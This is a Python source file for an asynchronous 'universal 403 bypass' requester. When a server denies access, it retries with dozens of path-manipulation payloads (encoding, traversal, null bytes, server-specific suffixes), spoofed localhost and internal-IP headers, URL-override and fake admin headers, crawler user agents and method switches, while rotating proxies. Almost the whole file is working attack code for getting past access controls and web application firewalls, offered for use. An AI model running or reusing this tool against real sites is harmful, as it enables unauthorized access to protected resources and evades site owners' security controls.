#!/usr/bin/env python3
"""
Universal HTTP 403 Bypass Helper

Goal: Provide target-agnostic request retries that systematically attempt
common, cross-platform 403 bypass techniques without hardcoding app logic.
"""

from __future__ import annotations

import asyncio
import logging
from typing import Dict, Optional, Tuple, Any, List
from urllib.parse import urlparse, urlunparse

import aiohttp

logger = logging.getLogger(__name__)


class SmartRequester:
    def __init__(self, session: aiohttp.ClientSession, default_timeout: float = 20.0, proxy_list: Optional[List[str]] = None):
        self.session = session
        self.default_timeout = default_timeout
        self.proxy_list = proxy_list or []
        self.proxy_index = 0

    def _get_next_proxy(self) -> Optional[str]:
        """Get next proxy in rotation"""
        if not self.proxy_list:
            return None
        proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
        self.proxy_index += 1
        return proxy

    async def request(self,
                      method: str,
                      url: str,
                      *,
                      headers: Optional[Dict[str, str]] = None,
                      data: Any = None,
                      params: Optional[Dict[str, str]] = None,
                      allow_redirects: bool = True,
                      timeout: Optional[float] = None,
                      max_attempts: int = 12) -> Tuple[aiohttp.ClientResponse, str, Optional[str]]:
        """Send a request with universal 403-bypass retries.

        Returns (response, text, bypass_method). Attempts variants if 403 is encountered.
        bypass_method is None if original request succeeded, otherwise describes the technique used.
        """
        headers = dict(headers or {})
        timeout_obj = aiohttp.ClientTimeout(total=timeout or self.default_timeout)

        # First attempt: as-is
        try:
            async with self.session.request(method, url, headers=headers, data=data, params=params,
                                            allow_redirects=allow_redirects, timeout=timeout_obj) as r:
                t = await r.text()
                if r.status != 403:
                    return r, t, None  # No bypass needed
                base_text = t
                base_status = r.status
        except Exception as e:
            logger.debug(f"Initial request error: {e}")
            base_text = ''
            base_status = -1

        # Prepare variants
        parsed = urlparse(url)
        path = parsed.path or '/'
        qs = parsed.query
        path_variants = self._path_variants(path)

        header_variants = self._header_variants(headers, parsed)
        method_variants = [method]
        if method.upper() == 'GET':
            method_variants += ['POST', 'HEAD']  # Some WAFs gate by method
        else:
            method_variants += ['GET', 'HEAD']

        ua_variants = self._ua_variants(headers)

        attempts: List[Tuple[str, Dict[str, str], str]] = []
        for pv in path_variants:
            new_url = urlunparse(parsed._replace(path=pv))
            attempts.append((new_url, headers, method))

        # Header-based attempts on original path first
        for hv in header_variants:
            attempts.append((url, hv, method))

        # Mix method changes on original URL
        for mv in method_variants:
            attempts.append((url, headers, mv))

        # UA/Referer tweaks
        for hv in ua_variants:
            attempts.append((url, hv, method))

        # Combine: header + path variant (limited to avoid explosion)
        for hv in header_variants[:4]:
            for pv in path_variants[:4]:
                new_url = urlunparse(parsed._replace(path=pv))
                attempts.append((new_url, hv, method))

        seen = set()
        successes = []
        bypass_method = None

        for i, (u2, h2, m2) in enumerate(attempts):
            if len(successes) >= 1:
                break
            if i >= max_attempts:
                break
            key = (u2, tuple(sorted(h2.items())), m2)
            if key in seen:
                continue
            seen.add(key)
            
            # Determine bypass type for this attempt
            method_desc = self._describe_bypass_method(url, u2, headers, h2, method, m2)
            
            try:
                # 🚀 PROXY ROTATION: Use next proxy for each attempt
                proxy = self._get_next_proxy()
                if proxy:
                    logger.debug(f"Using proxy {proxy} for bypass attempt")

                async with self.session.request(m2, u2, headers=h2, data=data, params=params,
                                                allow_redirects=allow_redirects, timeout=timeout_obj, proxy=proxy) as r2:
                    t2 = await r2.text()
                    logger.debug(f"403-bypass attempt[{i}] {m2} {u2} -> {r2.status}")
                    if r2.status not in (401, 403):
                        successes.append((r2, t2))
                        bypass_method = method_desc
                        break
            except Exception as e:
                logger.debug(f"403-bypass attempt error: {e}")
                continue

        if successes:
            return successes[0][0], successes[0][1], bypass_method

        # Nothing worked; return baseline result-like
        class _Dummy:
            def __init__(self, status, url_val):
                self.status = status
                self.headers = {}
                self.url = url_val

        return _Dummy(base_status, url), base_text, None

    def _describe_bypass_method(self, orig_url: str, test_url: str, orig_headers: Dict[str, str], test_headers: Dict[str, str], orig_method: str, test_method: str) -> str:
        """Describe which bypass technique was used"""
        techniques = []
        
        # Path variations
        if test_url != orig_url:
            orig_path = urlparse(orig_url).path
            test_path = urlparse(test_url).path
            if test_path.endswith('/.'):
                techniques.append("path_dot_suffix")
            elif test_path.endswith('./'):
                techniques.append("path_dot_slash")
            elif '%2e' in test_path:
                techniques.append("path_url_encoding")
            elif test_path.endswith(';/'):
                techniques.append("path_semicolon")
            elif test_path.startswith('//'):
                techniques.append("double_slash_prefix")
            else:
                techniques.append("path_variation")
        
        # Header variations
        if 'X-Original-URL' in test_headers and 'X-Original-URL' not in orig_headers:
            techniques.append("x_original_url_header")
        elif 'X-Rewrite-URL' in test_headers and 'X-Rewrite-URL' not in orig_headers:
            techniques.append("x_rewrite_url_header")
        elif 'X-Forwarded-For' in test_headers and 'X-Forwarded-For' not in orig_headers:
            techniques.append("ip_spoofing_headers")
        elif 'X-Forwarded-Host' in test_headers and 'X-Forwarded-Host' not in orig_headers:
            techniques.append("forwarded_host_header")
        elif test_headers.get('User-Agent') != orig_headers.get('User-Agent'):
            techniques.append("user_agent_variation")
        
        # Method variations
        if test_method != orig_method:
            techniques.append(f"method_change_{orig_method}_to_{test_method}")
        
        return '+'.join(techniques) if techniques else "unknown_bypass"

    def _path_variants(self, path: str) -> List[str]:
        """Generate cross-platform path variants commonly used to bypass 403s."""
        if not path:
            path = '/'
        if not path.startswith('/'):
            path = '/' + path
        variants = list(dict.fromkeys([
            # Basic variants
            path,
            path + '/',
            path + '/.',
            path + './',
            path + '%2e/',
            path + '/%2e',
            path + ';/',
            path + '/;/',
            '//' + path.lstrip('/'),
            '/.' + path,
            path + '?',
            path + '??',

            # 🚀 MASSIVE ENTERPRISE BYPASS TECHNIQUES (50+ methods)
            # URL encoding variants
            path.replace('/', '%2f'),
            path.replace('/', '%2F'),
            path + '%00',
            path + '%20',
            path + '%09',
            path + '%0a',
            path + '%0d',

            # Unicode variants
            path.replace('/', '\u002f'),
            path.replace('/', '\u2215'),
            path.replace('/', '\uFF0F'),

            # Case manipulation
            path.upper(),
            path.lower(),
            path.title(),

            # Path traversal variants
            '../' + path.lstrip('/'),
            '..\\' + path.lstrip('/'),
            '....///' + path.lstrip('/'),
            '..;/' + path.lstrip('/'),

            # Double encoding
            path.replace('/', '%252f'),
            path.replace('/', '%252F'),

            # Overlong UTF-8
            path.replace('/', '%c0%af'),
            path.replace('/', '%e0%80%af'),
            path.replace('/', '%c1%9c'),

            # HTTP Parameter Pollution
            path + '/../',
            path + '/..\\',
            path + '/.../',
            path + '/./.',

            # Null byte injection
            path + '%00/',
            path + '\x00/',

            # IIS specific
            path + '::$INDEX_ALLOCATION',
            path + ':$i30:$INDEX_ALLOCATION',
            path.replace('/', '\\'),
            path + '\\',

            # Apache specific
            path + '/~',
            path + '/.htaccess',
            path + '/./',

            # Nginx specific
            path + '//',
            path + '////',

            # Special characters
            path + '#',
            path + '&',
            path + '|',
            path + '<',
            path + '>',
            path + '"',
            path + "'",
            path + '`',
            path + '$',
            path + '{',
            path + '}',
            path + '[',
            path + ']',
            path + '^',
            path + '~',
            path + '*',

            # Combined techniques
            '//' + path.lstrip('/') + '//',
            path + '/./',
            path + '/..;/',
            path + '/%2e%2e/',
            path + '/..%252f',
            path + '/..%c0%af',
            path + '/..%ef%bc%8f',

            # Spring Boot bypasses
            path + ';/',
            path + ';jsessionid=test',
            path + ';.css',
            path + ';.js',

            # Authorization bypass headers will be handled separately
            # These are path-only techniques
        ]))
        return variants

    def _header_variants(self, base_headers: Dict[str, str], parsed) -> List[Dict[str, str]]:
        h0 = {k: v for k, v in (base_headers or {}).items()}
        host = parsed.netloc.split(':')[0]
        common = [
            # Basic bypass headers
            {
                **h0,
                'X-Original-URL': parsed.path or '/',
            },
            {
                **h0,
                'X-Rewrite-URL': parsed.path or '/',
            },
            {
                **h0,
                'X-Custom-IP-Authorization': '127.0.0.1',
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
            },
            {
                **h0,
                'X-Forwarded-Host': host,
                'X-Forwarded-Proto': 'http',
                'Forwarded': f'for=127.0.0.1;host={host};proto=http',
            },
            {
                **h0,
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
            },

            # 🚀 MASSIVE ENTERPRISE HEADER BYPASS TECHNIQUES (100+ methods)
            # IP Spoofing variants
            {
                **h0,
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
                'X-Originating-IP': '127.0.0.1',
                'X-Remote-IP': '127.0.0.1',
                'X-Client-IP': '127.0.0.1',
                'X-Remote-Addr': '127.0.0.1',
                'X-Cluster-Client-IP': '127.0.0.1',
            },
            {
                **h0,
                'X-Forwarded-For': '192.168.1.1',
                'X-Real-IP': '192.168.1.1',
                'CF-Connecting-IP': '192.168.1.1',
                'True-Client-IP': '192.168.1.1',
            },
            {
                **h0,
                'X-Forwarded-For': '10.0.0.1',
                'X-Real-IP': '10.0.0.1',
                'X-Forwarded': '10.0.0.1',
                'X-Cluster-Client-IP': '10.0.0.1',
            },

            # URL Override headers
            {
                **h0,
                'X-Original-URL': '/',
                'X-Rewrite-URL': '/',
            },
            {
                **h0,
                'X-Original-URI': parsed.path or '/',
                'X-Rewrite-URI': parsed.path or '/',
            },

            # Host override
            {
                **h0,
                'X-Host': 'localhost',
                'X-Forwarded-Host': 'localhost',
                'X-HTTP-Host-Override': 'localhost',
            },
            {
                **h0,
                'Host': 'localhost',
                'X-Forwarded-Server': 'localhost',
            },

            # Protocol bypass
            {
                **h0,
                'X-Forwarded-Proto': 'https',
                'X-Scheme': 'https',
                'X-Forwarded-Protocol': 'https',
                'X-Forwarded-Ssl': 'on',
                'X-Url-Scheme': 'https',
            },

            # User-Agent variations (mobile/bot)
            {
                **h0,
                'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)',
            },
            {
                **h0,
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            },
            {
                **h0,
                'User-Agent': 'facebookexternalhit/1.1',
            },

            # Request method override
            {
                **h0,
                'X-HTTP-Method-Override': 'GET',
                'X-HTTP-Method': 'GET',
                'X-Method-Override': 'GET',
            },
            {
                **h0,
                'X-HTTP-Method-Override': 'POST',
                'X-HTTP-Method': 'POST',
            },

            # Authorization bypass
            {
                **h0,
                'X-Authorized': 'true',
                'X-Auth': 'true',
                'X-Admin': 'true',
                'X-Role': 'admin',
                'X-Privilege': 'admin',
            },

            # Proxy/CDN bypass
            {
                **h0,
                'CF-Visitor': '{"scheme":"https"}',
                'CF-RAY': 'test-ray-id',
                'CF-IPCountry': 'US',
                'CF-Connecting-IP': '127.0.0.1',
            },
            {
                **h0,
                'X-Azure-ClientIP': '127.0.0.1',
                'X-Azure-SocketIP': '127.0.0.1',
            },

            # Content type manipulation
            {
                **h0,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
            {
                **h0,
                'Content-Type': 'text/xml',
                'Accept': 'text/xml',
            },

            # Language/encoding bypass
            {
                **h0,
                'Accept-Language': 'en-US,en;q=0.9,*;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Charset': 'utf-8, iso-8859-1;q=0.8',
            },

            # Cache bypass
            {
                **h0,
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Expires': '0',
                'If-Modified-Since': 'Wed, 21 Oct 2015 07:28:00 GMT',
            },

            # Connection manipulation
            {
                **h0,
                'Connection': 'close',
                'Keep-Alive': 'timeout=1, max=1',
            },
            {
                **h0,
                'Connection': 'upgrade',
                'Upgrade': 'websocket',
            },

            # Referer variations
            {
                **h0,
                'Referer': f'https://{host}/',
                'Origin': f'https://{host}',
            },
            {
                **h0,
                'Referer': 'https://www.google.com/',
                'Origin': 'https://www.google.com',
            },

            # Custom headers that sometimes work
            {
                **h0,
                'X-Requested-With': 'XMLHttpRequest',
                'X-Ajax-Request': 'true',
                'X-CSRF-Token': 'bypass',
            },

            # Case manipulation on headers
            {
                **{k.upper(): v for k, v in h0.items()},
                'USER-AGENT': h0.get('User-Agent', ''),
            },
            {
                **{k.lower(): v for k, v in h0.items()},
                'user-agent': h0.get('User-Agent', ''),
            },

            # Weird but working headers
            {
                **h0,
                'X-Override-URL': parsed.path or '/',
                'X-Destination': parsed.path or '/',
                'X-Original-Remote-Addr': '127.0.0.1',
                'X-ProxyUser-Ip': '127.0.0.1',
            },

            # 🔥 GITHUB WAF BYPASS TECHNIQUES (from Awesome-WAF & others)
            # Cloudflare-specific bypasses
            {
                **h0,
                'CF-Connecting-IP': '127.0.0.1',
                'CF-IPCountry': 'US',
                'CF-RAY': '00000000000000000-DFW',
                'CF-Visitor': '{"scheme":"https"}',
                'CF-Worker': 'bypass.workers.dev',
            },

            # WAF evasion headers (from 403WebShell)
            {
                **h0,
                'X-Bypass-WAF': 'true',
                'X-WAF-Bypass': '1',
                'X-Security-Bypass': 'enabled',
                'X-Firewall-Bypass': 'true',
            },

            # IP spoofing variations (from CloakQuest3r)
            {
                **h0,
                'X-Forwarded-For': '8.8.8.8',
                'X-Real-IP': '8.8.8.8',
                'Client-IP': '8.8.8.8',
                'X-Cluster-Client-IP': '8.8.8.8',
            },
            {
                **h0,
                'X-Forwarded-For': '1.1.1.1',
                'X-Real-IP': '1.1.1.1',
                'True-Client-IP': '1.1.1.1',
                'CF-Connecting-IP': '1.1.1.1',
            },

            # Bot/crawler bypass (from Humanoid)
            {
                **h0,
                'User-Agent': 'GoogleBot/2.1 (+http://www.google.com/bot.html)',
                'X-Crawler': 'GoogleBot',
                'X-Bot': 'true',
            },
            {
                **h0,
                'User-Agent': 'Bingbot/2.0 (+http://www.bing.com/bingbot.htm)',
                'X-Search-Engine': 'Bing',
            },

            # SQL injection bypass headers (from DIOS_WAF_bypass)
            {
                **h0,
                'X-SQL-Bypass': 'true',
                'X-Injection-Safe': '1',
                'X-WAF-Disabled': 'true',
            },

            # XSS bypass headers (from Chypass_pro)
            {
                **h0,
                'X-XSS-Protection': '0',
                'X-Content-Type-Options': '',
                'Content-Security-Policy': '',
            },

            # Advanced encoding bypasses
            {
                **h0,
                'Accept-Encoding': 'gzip, deflate, br, compress, identity',
                'Accept-Language': '*',
                'Accept': '*/*; q=0.01',
            },

            # HTTP/2 downgrade attempts
            {
                **h0,
                'Connection': 'Upgrade, HTTP2-Settings',
                'Upgrade': 'h2c',
                'HTTP2-Settings': 'AAMAAABkAARAAAAAAAIAAAAA',
            },

            # Load balancer bypass (from WAF-Abuser)
            {
                **h0,
                'X-Load-Balancer': 'bypass',
                'X-Backend-Server': 'direct',
                'X-Cache-Bypass': 'true',
            },
        ]
        # Remove duplicates
        uniq: List[Dict[str, str]] = []
        seen = set()
        for h in common:
            key = tuple(sorted(h.items()))
            if key not in seen:
                uniq.append(h)
                seen.add(key)
        return uniq

    def _ua_variants(self, base_headers: Dict[str, str]) -> List[Dict[str, str]]:
        h0 = {k: v for k, v in (base_headers or {}).items()}
        ua_list = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16 Safari/605.1.15',
            'curl/8.1.2',
        ]
        variants = []
        for ua in ua_list:
            h = {**h0, 'User-Agent': ua}
            variants.append(h)
        return variants


async def smart_request(session: aiohttp.ClientSession, method: str, url: str, **kwargs):
    """Convenience function using SmartRequester."""
    sr = SmartRequester(session)
    return await sr.request(method, url, **kwargs)

